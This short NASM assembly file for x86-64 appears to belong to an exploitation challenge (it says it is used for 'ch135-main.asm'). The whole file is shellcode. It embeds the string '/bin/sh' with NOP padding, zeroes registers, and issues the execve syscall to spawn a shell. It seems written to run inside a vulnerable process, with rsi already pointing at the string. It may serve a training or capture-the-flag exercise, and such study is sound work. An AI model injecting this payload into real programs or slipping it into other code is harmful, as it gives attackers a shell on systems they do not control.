; used for ch135-main.asm

[BITS 64]

%define SYS_EXEC 59

[SECTION .TEXT]
	global _start

_start:
	; lea rsi, [REL _string]
	; jmp _begin

_string:
	db "/bin/sh", 0
	times 10 nop

_begin:
	sub edi, edi
	sub edx, edx
	sub eax, eax
	mov al, SYS_EXEC
	xchg rdi, rsi
	syscall
